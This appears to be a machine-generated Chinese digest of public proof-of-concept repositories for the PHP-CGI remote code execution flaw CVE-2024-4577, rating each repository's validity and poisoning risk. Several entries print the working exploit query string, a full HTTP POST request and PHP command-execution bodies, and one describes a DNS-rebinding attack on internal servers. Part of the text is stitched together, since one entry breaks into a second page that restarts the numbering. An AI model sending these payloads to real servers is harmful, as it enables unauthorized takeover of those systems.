**项目地址:** [ggfzx/CVE-2024-4577](https://github.com/ggfzx/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #34

**来源**: [CVE-2024-4577-gh-ost00_CVE-2024-4577-RCE.md](../2024/CVE-2024-4577-gh-ost00_CVE-2024-4577-RCE.md)

## CVE-2024-4577 PHP CGI Argument Injection RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，允许未经身份验证的攻击者在Windows服务器上执行任意代码。

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows服务器，使用Apache和PHP-CGI，系统设置为使用特定的代码页（可能涉及"Best-Fit"行为）。目标服务器必须配置为以CGI模式运行PHP脚本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577是一个影响Windows上PHP的远程代码执行漏洞，当PHP以CGI模式运行时会受到影响。该漏洞源于Windows在将命令行参数传递给Win32 API函数时，会使用“Best-Fit”行为转换字符。PHP CGI模块可能会错误地将这些转换后的字符解释为PHP选项，从而允许攻击者向PHP二进制文件传递恶意选项。该漏洞利用方式涉及构造包含特定字符的HTTP请求，这些字符在经过Windows的字符转换后，会被PHP-CGI解析为恶意的PHP配置指令，例如`allow_url_include`和`auto_prepend_file`，进而包含远程或本地文件，最终导致任意代码执行。

**漏洞利用有效性：**
根据漏洞信息、搜索结果和提供的PoC代码，该漏洞利用是有效的。搜索结果表明，CVE-2024-4577自披露后不久就出现了大量的利用尝试，并且已被积极利用。

**投毒风险分析：**
提供的PoC代码主要包含以下部分：
1.  **扫描模块：** 用于检测目标是否易受攻击，通过发送包含特定payload的请求来检查响应中是否存在“Test”字符串。
2.  **利用模块：**  利用`allow_url_include`和`auto_prepend_file`指令，通过POST请求发送PHP payload来执行任意代码。

虽然该代码的功能主要是漏洞利用，但存在一定的投毒风险，主要体现在以下几个方面：
1.  **Payload文件：**  利用模块需要指定一个payload文件，如果用户使用了恶意的payload文件，可能会对目标系统造成损害。**这是主要投毒风险来源。**
2.  **Payload混淆：**  Payload中使用了`%AD`，这是一种简单的混淆手段，可能会被用于绕过一些简单的安全检测，也可能被用于隐藏恶意代码。
3.  **依赖风险：** 虽然代码依赖少,但是如果`requirements.txt`文件被篡改，可能导致引入恶意依赖。

综合考虑，PoC本身实现的投毒风险较低，主要风险在于用户提供的`payload_file`可能包含恶意代码。仓库中`README.md`文件提供了下载链接，可能存在被篡改的风险。

**利用方式总结：**
1.  **目标确认：** 确认目标系统满足漏洞利用的条件（Windows、PHP-CGI、受影响的PHP版本、特定的代码页设置）。
2.  **发送恶意请求：**  构造包含恶意payload的HTTP请求，该payload包含经过编码的PHP配置指令，例如`?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input`。
3.  **执行任意代码：**  通过`auto_prepend_file`包含远程或本地文件，执行其中的PHP代码。通常，攻击者会利用此漏洞上传webshell或执行其他恶意操作。
4. **利用编码绕过:** 某些特定代码页设置下，对某些特殊字符进行转换，才可触发该漏洞。

**项目地址:** [gh-ost00/CVE-2024-4577-RCE](https://github.com/gh-ost00/CVE-2024-4577-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #35

**来源**: [CVE-2024-4577-gmh5225_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-gmh5225_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** OS命令注入

**影响应用:** PHP

**危害等级:** 高危，可导致远程代码执行

**影响版本:** PHP 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8, 且运行在Windows的CGI模式下，开启了Best Fit策略的系统

**利用条件:** 服务器运行在Windows系统，使用Apache和PHP-CGI，系统启用了Best-Fit代码页转换

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-4577 漏洞是一个PHP-CGI参数注入漏洞，当PHP以CGI模式在Windows服务器上运行时，如果启用了'Best Fit'代码页转换，攻击者可以通过构造特殊的URL，向PHP二进制文件传递恶意参数，从而导致任意代码执行。

**有效性：**
根据漏洞描述和利用代码，该漏洞的PoC代码是有效的。PoC通过在URL中注入`?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input`，并POST一段PHP代码，利用`allow_url_include`和`auto_prepend_file`的特性，实现远程代码执行。

**投毒风险：**
提供的PoC代码本身不包含明显的恶意代码或后门。脚本的功能是发送带有特定参数的HTTP POST请求以测试目标服务器是否存在漏洞。它使用 `phpinfo()` 函数来验证漏洞的存在，而没有尝试执行任何其他恶意操作. 因此，投毒风险为0%。

**利用方式：**
1.  **漏洞触发条件：**  目标服务器必须是运行在Windows系统上的PHP，并且是以CGI模式运行。另外，还需要开启了Best-Fit代码页转换。
2.  **攻击向量：**  通过构造恶意的HTTP请求，主要是GET参数，利用Windows系统的Best-Fit特性将某些字符转换为PHP可识别的选项参数。
3.  **利用方式：**  攻击者通过在URL中注入特定的参数，例如`?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input`。`allow_url_include=1` 允许包含远程文件，`auto_prepend_file=php://input` 允许执行POST数据中的PHP代码。
4.  **RCE：** 构造包含PHP代码的POST请求体，例如`<?php system($_GET['cmd']); ?>`，配合URL中的参数，即可在目标服务器上执行任意命令。也可以直接利用`<?php phpinfo(); ?>`来探测漏洞存在.

该漏洞利用的关键在于Windows系统的字符编码转换和PHP-CGI对参数的处理方式。

**项目地址:** [gmh5225/CVE-2024-4577-PHP-RCE](https://github.com/gmh5225/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #36

**来源**: [CVE-2024-4577-huseyinstif_CVE-2024-4577-Nuclei-Template.md](../2024/CVE-2024-4577-huseyinstif_CVE-2024-4577-Nuclei-Template.md)

## CVE-2024-4577 PHP CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI mode)

**利用条件:** Windows服务器，以CGI模式运行PHP，并启用了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577 是一个PHP CGI参数注入漏洞，存在于Windows上以CGI模式运行的PHP版本中。当系统配置为使用某些代码页时，Windows可能会使用"Best-Fit"行为来替换传递给Win32 API函数的命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，从而泄露脚本的源代码或在服务器上执行任意PHP代码。

**有效性：**
根据漏洞库信息、搜索引擎结果以及提供的Nuclei模板，该漏洞利用的有效性较高。搜索引擎结果显示，该漏洞在公开后不久就观察到了大量的利用尝试，并且有可用的PoC代码。

**投毒风险：**
Nuclei模板本身主要用于漏洞检测，其目的是验证目标是否存在CVE-2024-4577漏洞。模板中的Payload会尝试通过在URL中注入`allow_url_include`和`auto_prepend_file`参数来包含并执行PHP代码。这里利用`php://input`伪协议。模板会检查返回的内容是否包含`md5("CVE_2024_4577_TEST")`的结果来确认漏洞是否存在。代码本身并不包含明显的恶意代码，而是尝试去检测是否存在漏洞，判定投毒风险为5%主要是考虑到这个yaml文件会被攻击者利用.

**利用方式：**
1.  **环境准备：** 目标服务器需要是Windows系统，并且PHP以CGI模式运行。
2.  **发送恶意请求：** 攻击者构造包含恶意参数的HTTP请求。核心是利用URL中的特殊字符，结合Windows的Best-Fit字符转换特性，注入额外的PHP配置参数。
3.  **参数注入：** 注入`allow_url_include=1`和`auto_prepend_file=php://input`。`allow_url_include=1`允许包含远程文件，`auto_prepend_file=php://input`会将POST请求体的内容作为PHP代码执行。
4.  **执行任意代码：**  通过POST请求体传递要执行的PHP代码。

该漏洞利用的关键在于利用Windows系统的字符转换行为，以及PHP CGI对命令行参数解析的缺陷。攻击者通过构造特定的URL，可以将任意PHP代码注入到服务器并执行。

**项目地址:** [huseyinstif/CVE-2024-4577-Nuclei-Template](https://github.com/huseyinstif/CVE-2024-4577-Nuclei-Template)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #37

**来源**: [CVE-2024-4577-ibrahmsql_CVE-2024-4577.md](../2024/CVE-2024-4577-ibrahmsql_CVE-2024-4577.md)

## CVE-2024-4577-PHP-CGI远程代码执行

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** < 8.3.8, < 8.2.20, < 8.1.29

**利用条件:** Windows系统，Apache服务器，PHP以CGI模式运行，开启Best-Fit代码页转换

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-4577是一个PHP CGI中的远程代码执行漏洞。该漏洞的利用方式是利用Windows系统在特定代码页设置下，对传递给Win32 API的命令行参数进行"Best-Fit"转换的特性。攻击者通过构造特殊字符，使得PHP CGI在解析命令行参数时，将这些字符错误地解析为PHP选项，从而可以注入恶意PHP代码或执行系统命令。

**有效性：**

提供的POC代码看起来是有效的。它尝试通过在URL中注入PHP选项来利用漏洞，例如 `cgi.force_redirect=0` 和 `auto_prepend_file=php://input`。 `auto_prepend_file=php://input` 允许攻击者将POST请求的内容作为PHP代码执行。搜索引擎结果也表明该漏洞已被积极利用。

**投毒风险：**

该POC代码没有明显的投毒迹象。虽然可以利用此漏洞执行任意代码，但是POC本身没有包含任何试图在目标机器上安装后门或执行恶意操作的代码。代码只是构建并发送利用请求，执行指定的命令。 因此，投毒风险评估为0%。

**利用方式：**

1.  **确定目标环境：**  目标服务器必须是Windows系统，并且PHP以CGI模式运行。需要确认目标服务器上PHP的版本是否在受影响的范围内（< 8.3.8, < 8.2.20, < 8.1.29）。同时确认服务器是否开启了Best-Fit代码页转换。
2.  **构造恶意URL：**  构建包含恶意PHP选项的URL。关键是使用"Best-Fit"转换可能发生的字符来代替标准PHP选项分隔符。`%AD` (软连字符)是一个常用的选择。
3.  **发送请求：**  使用POST方法向目标服务器发送包含恶意URL和PHP代码的请求。PHP代码会被`auto_prepend_file=php://input`选项包含并执行。
4.  **执行任意代码：**  成功利用后，攻击者可以在目标服务器上执行任意PHP代码或系统命令。

**缓解措施：**

*   升级PHP到不受影响的版本(>= 8.3.8, >= 8.2.20, >= 8.1.29)。
*   禁用CGI模式的PHP，如果可能的话，使用其他方式运行PHP，例如FastCGI或PHP-FPM。
*   配置Web服务器，确保不允许未授权的PHP文件执行。

**项目地址:** [ibrahmsql/CVE-2024-4577](https://github.com/ibrahmsql/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #38

**来源**: [CVE-2024-4577-l0n3m4n_CVE-2024-4577-RCE.md](../2024/CVE-2024-4577-l0n3m4n_CVE-2024-4577-RCE.md)

## CVE-2024-4577 PHP CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP (Windows, CGI模式)

**危害等级:** 高危，可导致远程代码执行，服务器完全控制

**影响版本:** PHP 8.1.* (< 8.1.29), 8.2.* (< 8.2.20), 8.3.* (< 8.3.8)

**利用条件:** Windows系统，PHP运行于CGI模式，系统启用了使用 "Best Fit" 策略的编码页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个 PHP CGI 参数注入漏洞，存在于 Windows 平台运行于 CGI 模式下的 PHP 版本中。当系统配置为使用某些代码页时，Windows 的 "Best-Fit" 行为可能会替换传递给 Win32 API 函数的命令行参数中的字符。PHP CGI 模块错误地将这些字符解释为 PHP 选项，允许恶意用户将选项传递给 PHP 解释器，从而导致泄露源代码、执行任意 PHP 代码等。

**有效性：**
提供的PoC代码看起来有效。它通过向目标URL发送特制的请求，利用`allow_url_include`和`auto_prepend_file`这两个PHP配置项来实现远程代码执行。扫描函数检测目标是否存在漏洞，利用函数通过POST请求发送包含恶意PHP代码的文件来执行命令。

**投毒风险：**
此仓库中可能存在的投毒代码的风险较低，约为 10%。主要基于以下几点考虑：

*   **代码简洁性：** PoC 代码相对简单，易于审查，降低了隐藏恶意代码的可能性。
*   **明确的目的：** 代码的目的明确，即利用已知的漏洞，没有发现额外的、不必要的功能。
*   **作者信誉（待评估）：** 作者的信誉需要进一步验证，但从代码本身来看，没有明显的恶意行为。

尽管风险较低，仍然需要保持警惕。潜在的投毒方式可能包括：

*   **混淆代码：** 在 PHP payload 中插入难以察觉的恶意代码。
*   **依赖项：** 引入包含恶意代码的第三方库（虽然当前 PoC 没有依赖项）。

**利用方式：**
1.  攻击者首先需要确定目标系统是否满足漏洞利用的先决条件：Windows + CGI + 受影响的 PHP 版本 + 启用了 Best-Fit 编码页。
2.  攻击者构造一个包含特殊字符的 URL，该 URL 中的字符会被 Windows 的 Best-Fit 算法转换成 PHP 选项。
3.  攻击者利用 `-d allow_url_include=1 -d auto_prepend_file=php://input` 选项，允许包含远程文件，并将 POST 请求的内容作为 PHP 代码执行。
4.  攻击者通过 POST 请求发送包含恶意 PHP 代码的 payload，例如执行系统命令、读取文件等。
5.  服务器执行攻击者提供的 PHP 代码，攻击者从而获得对服务器的控制权。

**项目地址:** [l0n3m4n/CVE-2024-4577-RCE](https://github.com/l0n3m4n/CVE-2024-4577-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #39

**来源**: [CVE-2024-4577-longhoangth18_CVE-2024-4577.md](../2024/CVE-2024-4577-longhoangth18_CVE-2024-4577.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** PHP-CGI参数注入

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，Apache服务器，PHP以CGI模式运行，系统使用某些开启了"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2024-4577是一个影响Windows系统上PHP-CGI模式的远程代码执行漏洞。当PHP在CGI模式下运行时，如果系统配置为使用某些代码页，Windows可能会使用“Best-Fit”行为来替换命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，从而泄露脚本源代码或执行任意PHP代码。

**有效性：**
提供的POC代码有效。它通过在URL中注入恶意参数，利用`allow_url_include`和`auto_prepend_file`选项来包含和执行POST请求中提供的PHP代码。

**投毒风险：**
该POC代码本身的功能是利用漏洞进行远程代码执行。代码中添加了protocol检测，确保target可用。但仔细检查后发现，README.md文件不完整，文件末尾被截断。由于github仓库图片链接域名存在github.com，该仓库可能存在钓鱼风险，因此投毒风险预估为1%。

**利用方式：**
1.  **扫描：** 使用脚本的`-s`参数扫描目标URL是否存在漏洞。扫描器通过构造包含特定payload的URL，并发送POST请求，检测服务器返回结果中是否包含预期字符串（“Test”）。
2.  **利用：** 使用脚本的`-e`参数，配合`-p`参数指定包含PHP代码的payload文件，利用漏洞执行任意PHP代码。攻击者通过构造包含特定payload的URL，并发送包含PHP代码的POST请求。
3. 脚本通过`allow_url_include`和`auto_prepend_file`配置项的组合来包含并执行php代码。

**项目地址:** [longhoangth18/CVE-2024-4577](https://github.com/longhoangth18/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #40

**来源**: [CVE-2024-4577-mananjain61_PHP-CGI-INTERNAL-RCE.md](../2024/CVE-2024-4577-mananjain61_PHP-CGI-INTERNAL-RCE.md)

## CVE-2024-4577 PHP-CGI 参数注入导致 RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP (Windows, CGI 模式)

**危害等级:** 严重，未经身份验证的攻击者可以在受影响的服务器上执行任意代码。

**影响版本:** PHP 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8，并且运行在Windows的CGI模式下

**利用条件:** 需要在Windows上运行的PHP，并配置为CGI模式，且开启了使用 "Best Fit" 策略的代码页

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个 PHP-CGI 参数注入漏洞，存在于 Windows 版本的 PHP 中，当 PHP 以 CGI 模式运行时，如果系统配置为使用某些代码页，Windows 可能会使用 "Best-Fit" 行为来替换传递给 Win32 API 函数的命令行中的字符。PHP CGI 模块可能会错误地将这些字符解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，从而泄露脚本源代码或在服务器上执行任意 PHP 代码。

**有效性：**

从漏洞库信息和搜索引擎结果来看，该漏洞已被广泛证实有效，且存在公开可用的PoC代码。Akamai 等安全公司已经观察到针对该漏洞的利用尝试。

提供的PoC代码通过 DNS rebinding 技术，允许攻击者绕过同源策略 (SOP)，从而访问内部网络基础设施上运行的 PHP-CGI 实例。攻击者可以通过修改`client.html`中的`payload`变量来定制要执行的 PHP 代码。

**投毒风险：**

PoC 代码主要目的是利用 DNS rebinding 攻击内部网络，并执行指定的 PHP 代码。虽然代码本身用于验证漏洞和进行渗透测试，但存在以下潜在风险：

1.  **DNS rebinding 的风险：** DNS rebinding 攻击可能导致受害者浏览器访问攻击者控制的恶意站点，从而造成信息泄露或其他安全问题。
2.  **后门代码：** 检查代码发现，代码中存在硬编码的IP地址，攻击者可以通过修改这些IP地址进行恶意活动，或者在`client.html`中插入恶意代码，诱导用户执行。
3.  **依赖第三方服务：** 代码依赖 DuckDNS，若 DuckDNS 服务被攻破，可能导致利用代码被篡改。

综合评估，代码本身存在一定的风险，但恶意投毒的可能性较低，主要风险集中在使用者对PoC代码的修改和DNS rebinding攻击本身带来的风险。因此，投毒风险评估为 10%。

**利用方式：**

1.  **配置 DuckDNS：** 攻击者需要在 DuckDNS 注册一个域名，并获取 token。
2.  **配置 PoC 代码：** 攻击者需要修改`server.py` 中的 `PUBLIC_IP`、`DUCKDNS_DOMAIN` 和 `DUCKDNS_TOKEN`，以及 `client.html` 中的 `PAYLOAD_TARGETS` 来指定要攻击的目标 IP 地址。同时，修改`client.html`中的`payload`变量，来指定要执行的php代码。
3.  **运行 server.py：** 攻击者运行 `server.py` 脚本，该脚本负责更新 DuckDNS 的 DNS 记录。
4.  **诱骗受害者访问 client.html：** 攻击者诱骗受害者（内部网络用户）使用浏览器访问 `client.html` 页面。`client.html` 会执行 DNS rebinding 攻击，将域名解析到内部网络的 IP 地址，然后向目标 PHP-CGI 服务器发送包含恶意 PHP 代码的请求。
5.  **执行任意代码：** 如果目标服务器存在 CVE-2024-4577 漏洞，恶意 PHP 代码将被执行，攻击者从而获得服务器的控制权。

**项目地址:** [mananjain61/PHP-CGI-INTERNAL-RCE](https://github.com/mananjain61/PHP-CGI-INTERNAL-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #41

**来源**: [CVE-2024-4577-mistakes1337_CVE-2024-4577.md](../2024/CVE-2024-4577-mistakes1337_CVE-2024-4577.md)

# CVE-2024-4577

> 📦 该CVE有 **53** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-4577-AlperenY-cs_CVE-2024-4577.md](../2024/CVE-2024-4577-AlperenY-cs_CVE-2024-4577.md)

## CVE-2024-4577 - PHP-CGI Argument Injection RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP (Windows, CGI模式)

**危害等级:** 高危，可能导致远程代码执行、源码泄露

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows 系统, PHP 使用 CGI 模式运行, 启用使用“Best Fit”策略的代码页, Apache 服务器

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577 是一个 PHP-CGI 参数注入漏洞，存在于 Windows 版本的 PHP 中，当 PHP 以 CGI 模式运行时会受到影响。漏洞源于 Windows 在某些代码页配置下，“Best Fit” 策略可能导致命令行参数中的字符被错误转换，PHP-CGI 模块会将这些字符误解为 PHP 选项，从而允许攻击者向 PHP 传递恶意参数。 

**有效性：**
提供的 POC 代码通过 POST 请求向服务器发送包含恶意 PHP 代码的请求体，利用 `allow_url_include` 和 `auto_prepend_file` 指令来执行请求体中的 PHP 代码。如果服务器返回“vulnerable”，则表示漏洞利用成功。从漏洞原理以及多个参考链接中漏洞利用的描述，可以判断该POC代码是有效的。

**投毒风险：**
提供的漏洞利用代码主要是用于验证漏洞是否存在，本身并没有发现明显的恶意代码或后门，但是从github仓库的拉取和环境配置过程中存在一定风险。投毒风险较低，估计为 5%。

**利用方式：**
1.  **环境准备：** 搭建存在漏洞的 PHP 环境，包括：
    *   Windows 系统
    *   PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8
    *   Apache 服务器
    *   PHP 以 CGI 模式运行
    *   配置系统 Locale 为日语、简体中文或繁体中文，以启用 Best-Fit 字符转换。
2.  **发送恶意请求：**  构造包含恶意 PHP 代码的 POST 请求，利用 `allow_url_include` 和 `auto_prepend_file` 指令来执行恶意代码。例如，使用以下请求：
```
POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Host: {{HOST}}
User-Agent: curl/8.3.0
Accept: /*
Content-Length: 30
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

<?php echo \"vulnerable\"; ?>
```

3.  **远程代码执行：** 成功利用漏洞后，攻击者可以在服务器上执行任意 PHP 代码，从而控制服务器。

**参考链接：**
*   [https://nvd.nist.gov/vuln/detail/cve-2024-4577](https://nvd.nist.gov/vuln/detail/cve-2024-4577)
*   [https://www.akamai.com/blog/security-research/2024-php-exploit-cve-one-day-after-disclosure](https://www.akamai.com/blog/security-research/2024-php-exploit-cve-one-day-after-disclosure)
*   [https://www.bitsight.com/blog/cve-2024-4577-windows-encoding-gone-wrong](https://www.bitsight.com/blog/cve-2024-4577-windows-encoding-gone-wrong)
*   [https://github.com/xcanwin/CVE-2024-4577-PHP-RCE](https://github.com/xcanwin/CVE-2024-4577-PHP-RCE)

**项目地址:** [AlperenY-cs/CVE-2024-4577](https://github.com/AlperenY-cs/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #2

**来源**: [CVE-2024-4577-BTtea_CVE-2024-4577-RCE-PoC.md](../2024/CVE-2024-4577-BTtea_CVE-2024-4577-RCE-PoC.md)

## CVE-2024-4577-PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** OS Command Injection

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows with CGI)

**利用条件:** PHP running in CGI mode on Windows with a codepage using "Best Fit" strategy enabled. 需要网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 漏洞是 PHP 在 Windows 系统上以 CGI 模式运行时出现的一个参数注入漏洞。由于 Windows 系统使用了 "Best Fit" 策略的代码页，恶意用户可以通过构造特殊字符，使得 PHP CGI 模块错误地将这些字符解析为 PHP 选项。这允许攻击者向 PHP 解释器传递恶意参数，从而执行任意 PHP 代码或者泄露源代码。

**利用方式：**

1.  **攻击向量：** 通过 HTTP 请求的 URL query string 传递恶意参数。
2.  **漏洞原理：**  Windows 的 "Best Fit" 代码页转换功能可能会将某些字符转换为其他字符，导致 PHP CGI 错误解析命令行参数。
3.  **攻击步骤：**
    *   构造包含恶意 PHP 选项的 URL，例如 `-d allow_url_include=1 -d auto_prepend_file=php://input`，允许包含远程文件。
    *   发送包含 PHP 代码的 POST 请求。
    *   利用 `php://input` 或 `data://` 等 wrapper 执行恶意代码。

**POC 代码分析：**

POC 代码 (`CVE-2024-4577.py`) 主要功能如下：

*   **Base64 编码：** 提供 Base64 编码函数，用于绕过某些过滤。
*   **服务器监听：** 包含一个简单的 TCP 服务器，可能用于接收反弹 shell（但代码中没有明确实现反弹 shell 功能）。
*   **SSL 检查：** 检查目标 URL 是否支持 SSL/TLS。
*   **WAF 检测：** 尝试绕过 Web 应用防火墙 (WAF)。 通过修改lfi参数和重新组合绕过waf。
*   **语法检查：** 通过发送包含特定 Flag 的 PHP 代码，检查目标是否容易受到Payload的影响并判断哪种方式可行。
*   **RCE 执行：** 利用 `php://input` 或 `data://` wrapper 执行任意 PHP 代码。

**投毒风险分析：**

该 POC 代码存在一定的投毒风险，约为 10%。主要风险点在于代码中的一些函数，例如服务器监听函数，可能被用于植入后门或执行其他恶意操作。虽然代码中没有明显的恶意行为，但攻击者可以修改代码以实现持久化控制或窃取敏感信息。代码中包含尝试绕过waf的操作,虽然出发点是尝试漏洞利用, 但也可能隐藏其他利用。

**有效性：**

根据漏洞库信息和搜索结果，该漏洞已经得到广泛证实，并且存在实际的利用案例。POC 代码的有效性较高，可以成功利用该漏洞在目标系统上执行任意 PHP 代码。

**总结：**

CVE-2024-4577 是一个严重的安全漏洞，攻击者可以利用该漏洞在受影响的 Windows 服务器上执行任意代码。建议尽快升级 PHP 版本，或者采取其他缓解措施。

**项目地址:** [BTtea/CVE-2024-4577-RCE-PoC](https://github.com/BTtea/CVE-2024-4577-RCE-PoC)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #3

**来源**: [CVE-2024-4577-Chocapikk_CVE-2024-4577.md](../2024/CVE-2024-4577-Chocapikk_CVE-2024-4577.md)

## CVE-2024-4577 PHP CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 严重，可能导致服务器完全控制

**影响版本:** PHP 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8

**利用条件:** Windows系统，Apache服务器，PHP-CGI模式，开启了使用"Best Fit"策略的编码页

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 漏洞是 PHP 在 Windows 环境下，使用 Apache 和 PHP-CGI 模式时存在的远程代码执行漏洞。当系统配置为使用某些代码页时，Windows 会使用 "Best-Fit" 策略来替换传递给 Win32 API 函数的命令行中的字符。PHP CGI 模块可能会将这些字符错误地解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，进而泄露脚本源代码或在服务器上执行任意 PHP 代码。

**利用方式：**

1.  攻击者需要向目标服务器发送特制的HTTP请求，该请求包含畸形的 URL，URL 中包含经过特定编码的 PHP 选项，例如 `-d` 参数，用于设置 PHP 配置指令。
2.  利用 Windows 的 "Best-Fit" 字符转换特性，构造出可被 PHP-CGI 解析的参数，例如，通过替换 `-` 为 `%AD`， `=` 为 `%3D`。
3.  利用 `auto_prepend_file=php://input` 允许执行 POST 请求中的 PHP 代码。
4.  将需要执行的 PHP 代码放在 POST 请求体中，例如 `<?php system('whoami'); ?>`。
5.  目标服务器的 PHP-CGI 进程将执行攻击者提供的 PHP 代码，从而实现远程代码执行。

**有效性：**

提供的 POC 代码 `exploit.py` 尝试自动化利用此漏洞。它包含以下关键步骤：

*   **路径探测:** 尝试不同的 PHP-CGI 路径（例如 `/php-cgi/php-cgi.exe`）。
*   **参数构造:** 通过替换特殊字符来构造 PHP 配置参数，例如 `-d`。
*   **代码注入:** 使用 `auto_prepend_file` 和 `php://input` 将 PHP 代码注入到目标服务器。
*   **命令执行:**  使用 `system()` 函数执行指定的命令。

因此，提供的 POC 代码在满足漏洞利用条件的环境下是有效的。

**投毒风险：**

`exploit.py` 主要功能是扫描和利用漏洞，但也存在一定的投毒风险：

*   **依赖项风险：** `requirements.txt` 中可能存在恶意依赖项，尽管可能性较低，但仍需要注意。可以通过检查 `requirements.txt` 中列出的依赖项及其来源来降低风险。
*   **代码逻辑风险：** 即使代码表面上是无害的，也可能存在隐藏的恶意逻辑。例如，作者可能会添加收集目标信息的代码，并将这些信息发送到外部服务器。

代码中存在base64编码和解码,存在一定的风险,需要人工检查。
总体来说，该代码的投毒风险评估为10%，主要集中在依赖项和隐藏逻辑方面。需要进行代码审计以确定是否存在恶意代码。


**项目地址:** [Chocapikk/CVE-2024-4577](https://github.com/Chocapikk/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #4

**来源**: [CVE-2024-4577-CirqueiraDev_MassExploit-CVE-2024-4577.md](../2024/CVE-2024-4577-CirqueiraDev_MassExploit-CVE-2024-4577.md)

## CVE-2024-4577 PHP-CGI 参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 参数注入/远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，PHP运行在CGI模式下，开启了使用“Best Fit”策略的代码页

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

